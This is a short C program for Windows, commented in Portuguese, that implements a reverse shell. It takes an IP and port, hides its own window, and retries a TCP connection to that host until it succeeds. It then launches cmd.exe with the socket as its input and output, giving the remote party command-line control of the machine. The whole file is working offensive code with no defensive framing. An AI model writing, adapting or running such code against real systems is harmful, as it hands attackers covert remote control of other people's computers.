#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winsock2.h>
#include <stdbool.h>

struct sockaddr_in server;
STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;

int main(int argc , char *argv[])
{
    if(argc != 3)
    {
        fprintf(stderr , "Use: %s [IP] [PORTA]\n\n", argv[0]);
        return 1;
    }

    char *ip = argv[1];
    int porta = atoi(argv[2]);

    ShowWindow(GetForegroundWindow(),SW_HIDE); // Rodar o programa em background

    // Criando socket
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2,2), &wsaData);
	SOCKET sock = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);
    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_family = AF_INET;
    server.sin_port = htons(porta);

    // Se conecta ao servidor
    while(WSAConnect(sock,(SOCKADDR*)&server, sizeof(server),NULL,NULL,NULL,NULL) != 0);

    // Herdando descritores do processo pai
    memset(&ini_processo, 0, sizeof(ini_processo));
	ini_processo.cb = sizeof(ini_processo);
	ini_processo.dwFlags = STARTF_USESTDHANDLES;
	ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)sock;

	// Criando processo filho e executando a shell
    char command[] = "cmd.exe";
	BOOL res = CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

    return 0;
}